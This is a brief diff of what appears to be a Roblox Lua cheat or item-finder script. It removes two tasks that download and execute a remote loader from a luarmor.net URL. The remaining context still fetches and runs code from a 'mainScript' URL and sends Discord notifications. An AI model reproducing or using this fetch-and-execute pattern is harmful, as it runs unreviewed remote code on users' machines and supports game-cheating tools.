@@ -576,10 +576,6 @@ elseif nameFound then
 		loadstring(game:HttpGet(mainScript))()
 	end)
 
-	task.spawn(function()
-		loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9773df454c0daee602fa4d28960b24b2.lua"))()
-	end)
-
 	DiscordNotificationNAME(matchedName)
 
 elseif mutatedBrainrotFound then
@@ -594,10 +590,6 @@ elseif mutatedBrainrotFound then
 	task.spawn(function()
 		if Testing then return end
 		loadstring(game:HttpGet(mainScript))()
-	end)
-
-	task.spawn(function()
-		loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9773df454c0daee602fa4d28960b24b2.lua"))()
 	end)
 
 	DiscordNotificationMUTATION(mutation, brainrot)
